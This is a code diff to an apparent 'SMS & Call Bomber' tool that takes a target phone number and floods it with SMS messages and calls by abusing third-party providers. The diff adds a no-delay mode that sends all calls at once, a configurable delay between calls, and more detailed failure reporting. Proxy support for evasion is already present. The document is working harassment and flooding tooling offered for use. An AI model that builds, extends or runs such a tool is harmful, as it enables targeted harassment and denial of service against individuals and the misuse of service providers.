@@ -23,7 +23,7 @@ from sms_bomber.ui.progress import ProgressTracker
 
 def parse_args() -> AppConfig:
     """Parse command line arguments and create configuration."""
-    parser = argparse.ArgumentParser(description="SMS & Call Bomber 2.0")
+    parser = argparse.ArgumentParser(description="SMS & Call Bomber 3.0")
     parser.add_argument("target", help="Target phone number")
     parser.add_argument(
         "-c", "--count", type=int, default=1, help="Number of bombing rounds"
@@ -37,6 +37,8 @@ def parse_args() -> AppConfig:
     parser.add_argument("-x", "--proxy", help="Proxy server (http/https)")
     parser.add_argument("--sms-only", action="store_true", help="SMS bombing only")
     parser.add_argument("--calls-only", action="store_true", help="Call bombing only")
+    parser.add_argument("--no-delay", action="store_true", help="Disable delay between calls (sends all at once)")
+    parser.add_argument("-d", "--delay", type=int, default=20, help="Delay in seconds between calls (default: 20)")
 
     args = parser.parse_args()
     config = AppConfig(
@@ -47,6 +49,8 @@ def parse_args() -> AppConfig:
         proxy=args.proxy,
         sms_only=getattr(args, 'sms_only', False),
         calls_only=getattr(args, 'calls_only', False),
+        no_delay=getattr(args, 'no_delay', False),
+        call_delay=getattr(args, 'delay', 20),
     )
     config.validate()
     return config
@@ -108,7 +112,14 @@ async def bomber(config: AppConfig) -> NoReturn:
             progress.update(task, advance=1)
             if config.verbose:
                 status = "✓" if result["success"] else "✗"
-                ui.console.print(f"[green][CALL][/green] {provider.name}: {status}")
+                error_info = ""
+                if not result["success"]:
+                    if "error" in result:
+                        error_info = f" | Error: {result['error']}"
+                    elif "status_code" in result:
+                        response = result.get("response", "")[:100]
+                        error_info = f" | Status: {result['status_code']} | Response: {response}"
+                ui.console.print(f"[green][CALL][/green] {provider.name}: {status}{error_info}")
             return result
 
         tasks = []
@@ -123,15 +134,48 @@ async def bomber(config: AppConfig) -> NoReturn:
                 return await process_call_provider(provider)
 
         for _ in range(config.count):
-            # Add SMS tasks
+            # Add SMS tasks (run in parallel)
             for provider in sms_providers:
                 tasks.append(asyncio.create_task(bounded_process_sms(provider)))
-            
-            # Add call tasks
-            for provider in call_providers:
-                tasks.append(asyncio.create_task(bounded_process_call(provider)))
 
-        results = await asyncio.gather(*tasks)
+        # Run all SMS tasks first
+        if tasks:
+            await asyncio.gather(*tasks)
+        
+        # Now process calls SEQUENTIALLY with delay between each (unless --no-delay)
+        if call_providers and not config.sms_only:
+            if config.no_delay:
+                ui.console.print("\n[yellow]📞 Starting call bombing (no delay - all at once)...[/yellow]")
+                call_tasks = [process_call_provider(provider) for provider in call_providers for _ in range(config.count)]
+                results = await asyncio.gather(*call_tasks)
+                for result in results:
+                    if result["success"]:
+                        ui.console.print(f"[green]✅ {result['provider']}: Call initiated![/green]")
+                    else:
+                        error_info = result.get("error", result.get("response", "Unknown error"))[:100]
+                        status_code = result.get("status_code", "N/A")
+                        ui.console.print(f"[red]❌ {result['provider']}: Failed (HTTP {status_code}) - {error_info}[/red]")
+            else:
+                ui.console.print(f"\n[yellow]📞 Starting call bombing ({config.call_delay}s delay between calls)...[/yellow]")
+                
+                for round_num in range(config.count):
+                    for i, provider in enumerate(call_providers):
+                        # Show countdown before call (except for first call)
+                        if round_num > 0 or i > 0:
+                            for remaining in range(config.call_delay, 0, -1):
+                                ui.console.print(f"\r[dim]⏱️  Next call in {remaining}s...[/dim]", end="")
+                                await asyncio.sleep(1)
+                            ui.console.print("\r" + " " * 40 + "\r", end="")  # Clear the countdown line
+                        
+                        # Make the call
+                        result = await process_call_provider(provider)
+                        
+                        if result["success"]:
+                            ui.console.print(f"[green]✅ {provider.name}: Call initiated![/green]")
+                        else:
+                            error_info = result.get("error", result.get("response", "Unknown error"))[:100]
+                            status_code = result.get("status_code", "N/A")
+                            ui.console.print(f"[red]❌ {provider.name}: Failed (HTTP {status_code}) - {error_info}[/red]")
 
     ui.console.print(tracker.get_stats_table())
 
